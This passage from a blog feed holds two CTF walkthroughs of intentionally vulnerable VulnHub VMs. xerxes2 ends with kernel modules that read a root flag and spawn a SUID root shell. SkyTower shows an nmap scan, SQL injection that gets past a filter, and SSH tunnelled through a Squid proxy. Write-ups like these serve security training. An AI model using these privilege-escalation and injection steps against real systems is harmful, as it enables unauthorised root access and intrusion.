</span><span class='line'>    <span class="k">if</span><span class="o">(</span><span class="nv">f</span> <span class="o">==</span> NULL<span class="o">)</span>
</span><span class='line'>        printk<span class="o">(</span>KERN_ALERT <span class="s2">&quot;filp_open error!!.\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span><span class="o">{</span>
</span><span class='line'>        // Get current segment descriptor
</span><span class='line'>        <span class="nv">fs</span> <span class="o">=</span> get_fs<span class="o">()</span><span class="p">;</span>
</span><span class='line'>        // Set segment descriptor associated to kernel space
</span><span class='line'>        set_fs<span class="o">(</span>get_ds<span class="o">())</span><span class="p">;</span>
</span><span class='line'>        // Read the file
</span><span class='line'>        f-&gt;f_op-&gt;read<span class="o">(</span>f, buf, 1024, <span class="p">&amp;</span>f-&gt;f_pos<span class="o">)</span><span class="p">;</span>
</span><span class='line'>        // Restore segment descriptor
</span><span class='line'>        set_fs<span class="o">(</span>fs<span class="o">)</span><span class="p">;</span>
</span><span class='line'>        // See what we <span class="nb">read </span>from file
</span><span class='line'>        printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;buf:%s\n&quot;</span>,buf<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    filp_close<span class="o">(</span>f,NULL<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> 0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>void cleanup_module<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;My module is unloaded\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I realised I needed a Makefile as well, so I knocked one of those up quickly (nothing complicated)</p>

<p>[plain]
obj-m += flag.o</p>

<p>all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</p>

<p>clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>With the <span class="nb">source </span>code and the Makefile, I <span class="k">then</span> compiled the kernel module and loaded it
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/kernel/kernel2/kernel3/kernel4 modules
make: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.o
/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c: In function ‘init_module’:
/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c:37:1: warning: the frame size of 1028 bytes is larger than 1024 bytes [-Wframe-larger-than=]
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.mod.o
  LD [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.ko
make: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae&#8217;
You have new mail in /var/mail/korenchkin
korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ sudo insmod flag2.ko
korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4$ dmesg | tail -20
[113593.419616] <code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
[113593.419617] </code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
[113593.419618]  </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
[113593.419619]   </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
[113593.419619]    d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
[113593.419620]   d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
[113593.419621] <em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM
[113593.419622]
[113593.419622]     congratulations on beating xerxes2!
[113593.419623]
[113593.419623]     I hope you enjoyed it as much as I did making xerxes2.
[113593.419624]     xerxes1 has been described as &lsquo;weird&rsquo; and &lsquo;left-field&rsquo;
[113593.419625]     and I hope that this one fits that description too :)
[113593.419625]
[113593.419626]     Many thanks to @TheColonial &amp; @rasta_mouse for testing!
[113593.419626]
[113593.419627]     Ping me on #vulnhub for thoughts and comments!
[113593.419627]
[113593.419628]                       @barrebas, July 2014
[113593.419628]</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>So, most people would go <span class="s2">&quot;I GOT THE FLAG !&quot;</span> and <span class="k">do</span> a little dance. Probably along these lines
</span><span class='line'>
</span><span class='line'>!<span class="o">[](</span>http://24.media.tumblr.com/d84096090e0740e9a0f9c91e94277f5a/tumblr_n411lwkMIO1qi4zmno1_500.gif<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>But I wanted more - I actually wanted a root shell. I wonder <span class="k">if</span> I can run shell scripts with a kernel module. Hmm... google ? I was drawn to <span class="o">[</span>this article<span class="o">](</span>http://people.ee.ethz.ch/~arkeller/linux/kernel_user_space_howto.html<span class="o">)</span> which provided the following code
</span><span class='line'>
</span><span class='line'><span class="o">[</span>c<span class="o">]</span>
</span><span class='line'><span class="c">#include &lt;linux/module.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;linux/kernel.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;linux/init.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;linux/proc_fs.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;asm/uaccess.h&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>static int __init usermodehelper_example_init<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  int <span class="nv">ret</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>  char *argv<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span><span class="s2">&quot;/home/arkeller/eth/paper/code/callee&quot;</span>, <span class="s2">&quot;2&quot;</span>, NULL <span class="o">}</span><span class="p">;</span>
</span><span class='line'>  char *envp<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span><span class="s2">&quot;HOME=/&quot;</span>, <span class="s2">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>, NULL <span class="o">}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  printk<span class="o">(</span><span class="s2">&quot;usermodehelper: init\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>  /* last parameter: <span class="m">1</span> -&gt; <span class="nb">wait </span><span class="k">until</span> execution has finished, <span class="m">0</span> go ahead without waiting*/
</span><span class='line'>  /* returns <span class="m">0</span> <span class="k">if</span> usermode process was started successfully, errorvalue otherwise*/
</span><span class='line'>  /* no possiblity to get <span class="k">return</span> value of usermode process*/
</span><span class='line'>  <span class="nv">ret</span> <span class="o">=</span> call_usermodehelper<span class="o">(</span><span class="s2">&quot;/home/arkeller/eth/paper/code/callee&quot;</span>, argv, envp, UMH_WAIT_EXEC<span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span>ret !<span class="o">=</span> 0<span class="o">)</span>
</span><span class='line'>      printk<span class="o">(</span><span class="s2">&quot;error in call to usermodehelper: %i\n&quot;</span>, ret<span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>      printk<span class="o">(</span><span class="s2">&quot;everything all right\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>        <span class="k">return</span> 0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>static void __exit usermodehelper_example_exit<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  printk<span class="o">(</span><span class="s2">&quot;usermodehelper: exit\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>module_init<span class="o">(</span>usermodehelper_example_init<span class="o">)</span><span class="p">;</span>
</span><span class='line'>module_exit<span class="o">(</span>usermodehelper_example_exit<span class="o">)</span><span class="p">;</span>
</span><span class='line'>MODULE_LICENSE<span class="o">(</span><span class="s2">&quot;GPL&quot;</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m on the home straight here - lets modify this code to run a shell script instead (the shell script used is identical to that used earlier to get from delacroix to polito).</p>

<p>[c]</p>

<h1>include &lt;linux/module.h></h1>

<h1>include &lt;linux/kernel.h></h1>

<h1>include &lt;linux/init.h></h1>

<h1>include &lt;linux/proc_fs.h></h1>

<h1>include &lt;asm/uaccess.h></h1>

<p>static int __init usermodehelper_example_init(void)
{
        int ret = 0;
        char <em>argv[] = {&ldquo;/home/korenchkin/runme.sh&rdquo;, &ldquo;2&rdquo;, NULL };
        char </em>envp[] = {&ldquo;HOME=/&rdquo;, &ldquo;PATH=/sbin:/usr/sbin:/bin:/usr/bin&rdquo;, NULL };</p>

<pre><code>    printk("usermodehelper: init\n");
    /* last parameter: 1 -&gt; wait until execution has finished, 0 go ahead without waiting*/
    /* returns 0 if usermode process was started successfully, errorvalue otherwise*/
    /* no possiblity to get return value of usermode process*/
    ret = call_usermodehelper("/home/korenchkin/runme.sh", argv, envp, UMH_WAIT_EXEC);
    if (ret != 0)
            printk("error in call to usermodehelper: %i\n", ret);
    else
            printk("everything all right\n");
    return 0;
</code></pre>

<p>}</p>

<p>static void __exit usermodehelper_example_exit(void)
{
        printk(&ldquo;usermodehelper: exit\n&rdquo;);
}</p>

<p>module_init(usermodehelper_example_init);
module_exit(usermodehelper_example_exit);
MODULE_LICENSE(&ldquo;GPL&rdquo;);</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I created another Makefile, compiled the module and loaded it
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>korenchkin@xerxes2:~$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/a modules
make: Entering directory <code>/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/a/a.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/a/a.mod.o
  LD [M]  /home/korenchkin/a/a.ko
make: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae&#8217;
korenchkin@xerxes2:~$ sudo insmod a.ko
korenchkin@xerxes2:~$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>!<span class="o">[](</span>http://media.giphy.com/media/DUuyU3KyYGLNS/giphy.gif<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>korenchkin@xerxes2:~$ ls -l /tmp
total 244
-rwxr-xr-x 1 delacroix delacroix    55 Aug  6 16:15 123.sh
-rwsrwxrwx 1 root      root      97284 Aug  8 03:40 rootshell
-rwsrwxrwx 1 polito    polito    97284 Aug  6 16:15 shell
korenchkin@xerxes2:~/a$ /tmp/rootshell</p>

<h1>id</h1>

<p>uid=1000(korenchkin) gid=1000(korenchkin) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
#</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Well, what <span class="k">do</span> you know - a binary owned by root with the SUID attribute <span class="nb">set </span>that drops us to a root shell. I<span class="err">&#39;</span>ll <span class="nb">echo </span>my SSH key into authorized_keys <span class="k">for</span> completeness, and SSH in as root and cat the /root/flag.txt file
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#48;&#x2e;&#49;&#48;&#x32;">&#114;&#111;&#111;&#x74;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#48;&#x2e;&#x31;&#x30;&#x32;</a></p>

<p>Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<p>root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@xerxes2:~# cat flag.txt</p>

<hr />

<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M&#8217;  <code>Mb MM'   </code> MM&#8217;  <code>Mb
 </code>MM,P   MM    MM MM&#8217;      <code>MM,P   MM    MM YM.           ,MM
  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M&#8217;  <br/>
  d&#8217; <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M&#8217;    <br/>
<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>

<pre><code>congratulations on beating xerxes2!

I hope you enjoyed it as much as I did making xerxes2. 
xerxes1 has been described as 'weird' and 'left-field'
and I hope that this one fits that description too :)

Many thanks to @TheColonial &amp; @rasta_mouse for testing!

Ping me on #vulnhub for thoughts and comments!

                  @barrebas, July 2014
</code></pre>

<p>root@xerxes2:~#</p>

<p>&#8220;`</p>

<p><img src="http://www.awesomelyluvvie.com/wp-content/uploads/2013/01/CharlieBrownDance2.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[I Climbed the SkyTower, But No Rapunzel :(]]></title>
    <link href="http://recrudesce.github.io/2014/08/05/i-climbed-the-skytower-but-no-rapunzel/"/>
    <updated>2014-08-05T23:49:01+01:00</updated>
    <id>http://recrudesce.github.io/2014/08/05/i-climbed-the-skytower-but-no-rapunzel</id>
    <content type="html"><![CDATA[<p>SkyTower is available from <a href="http://vulnhub.com/entry/skytower-1,96/">Vulnhub</a>, and is a quick brain teaser that everyone is encouraged to try. It doesn&rsquo;t take long, so it&rsquo;s fun to see if you can do in your lunchbreak. The walkthrough is going to be short and sweet - maybe with a few GIFs thrown in for good measure.</p>

<!-- more -->


<h2>So What Runneth Upon Thee ?</h2>

<p>Obviously NMAP is used to get a quick rundown of what services are available.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 -O -A -p1-65535 192.168.0.106
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-05 22:59 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.106
</span><span class='line'>Host is up <span class="o">(</span>0.00s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65532</span> closed ports
</span><span class='line'>PORT     STATE    SERVICE    VERSION
</span><span class='line'>22/tcp   filtered ssh
</span><span class='line'>80/tcp   open     http       Apache httpd 2.2.22 <span class="o">((</span>Debian<span class="o">))</span>
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>3128/tcp open     http-proxy Squid http proxy 3.1.20
</span><span class='line'><span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 400<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-open-proxy: Potentially OPEN proxy.
</span><span class='line'><span class="p">|</span>_Methods supported:  GET
</span><span class='line'><span class="p">|</span>_http-title: ERROR: The requested URL could not be retrieved
</span><span class='line'>MAC Address: 08:00:27:54:4A:37 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see http://nmap.org/submit/ <span class="o">)</span>.
</span><span class='line'>TCP/IP fingerprint:
</span><span class='line'>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>6.46%E<span class="o">=</span>4%D<span class="o">=</span>8/5%OT<span class="o">=</span>80%CT<span class="o">=</span>1%CU<span class="o">=</span>42026%PV<span class="o">=</span>Y%DS<span class="o">=</span>1%DC<span class="o">=</span>D%G<span class="o">=</span>Y%M<span class="o">=</span>080027%TM
</span><span class='line'>OS:<span class="o">=</span>53E153CE%P<span class="o">=</span>i686-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>103%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS
</span><span class='line'>OS:<span class="o">=</span>8<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M5B4ST11NW3%O2<span class="o">=</span>M5B4ST11NW3%O3<span class="o">=</span>M5B4NNT11NW3%O4<span class="o">=</span>M5B4ST11NW3%O5<span class="o">=</span>M
</span><span class='line'>OS:5B4ST11NW3%O6<span class="o">=</span>M5B4ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>3890%W2<span class="o">=</span>3890%W3<span class="o">=</span>3890%W4<span class="o">=</span>3890%W5<span class="o">=</span>3890%W6<span class="o">=</span>38
</span><span class='line'>OS:90<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>3908%O<span class="o">=</span>M5B4NNSNW3%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>
</span><span class='line'>OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q
</span><span class='line'>OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A
</span><span class='line'>OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
</span><span class='line'>OS:%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T
</span><span class='line'>OS:<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'><span class="m">1</span>   0.00 ms 192.168.0.106
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 33.35 seconds
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Not very exciting - SSH, HTTP and a SQUID proxy. Interestingly SSH is filtered, which means no easy route in :(</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/53193742.jpg" alt="53193742" /></a></p>

<p>HTTP is our next destination, which shows a nicely branded login page.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_001.png" alt="skytower_001" /></a></p>

<p>SQLi me-thinks.  Lets try some simple things like entering 123&#8217; or 1=1 into the email field and clicking Login</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_002.png" alt="skytower_002" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_003.png" alt="skytower_003" /></a></p>

<p>Hmm, no dice. Looks like the code is filtering out simple SQLi.  Can we fool this into filtering out the &lsquo;or&rsquo; and the &lsquo;=&rsquo; but still have an &lsquo;or&rsquo; clause left over ?  Turns out, yes we can ;)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_004.png" alt="skytower_004" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/skytower_005.png" alt="skytower_005" /></a></p>

<p>This requires a GIF&hellip;</p>

<p><img src="http://31.media.tumblr.com/tumblr_lvgefaA0WX1qhigt0o1_500.gif" alt="" /></p>

<hr />

<h2>Looting the Retirement Fund</h2>

<p>We now have SSH login credentials, but you&rsquo;ll remember earlier on that SSH is filtered externally. It is, however, possible to leverage the SQUID proxy to get an SSH session using proxytunnel to bind a local port.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# proxytunnel -p 192.168.0.106:3128 -d 127.0.0.1:22 -a 222
</span></code></pre></td></tr></table></div></figure>


<p>A quick netstat shows that our local port is available</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# netstat -antp tcp <span class="p">|</span> grep :222
</span><span class='line'>Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span><span class='line'>tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:222             0.0.0.0:*               LISTEN      5135/proxytunnel:
</span></code></pre></td></tr></table></div></figure>


<p>Let us SSH into it with the provided credentials</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh john@127.0.0.1 -p 222
</span><span class='line'>The authenticity of host <span class="s1">&#39;[127.0.0.1]:222 ([127.0.0.1]:222)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>127.0.0.1<span class="o">]</span>:222<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">john@127.0.0.1&#39;</span>s password:
</span><span class='line'>Linux SkyTower 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.54-2 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Fri Jun <span class="m">20</span> 07:41:08 2014
</span><span class='line'>
</span><span class='line'>Funds have been withdrawn
</span><span class='line'>Connection to 127.0.0.1 closed.
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


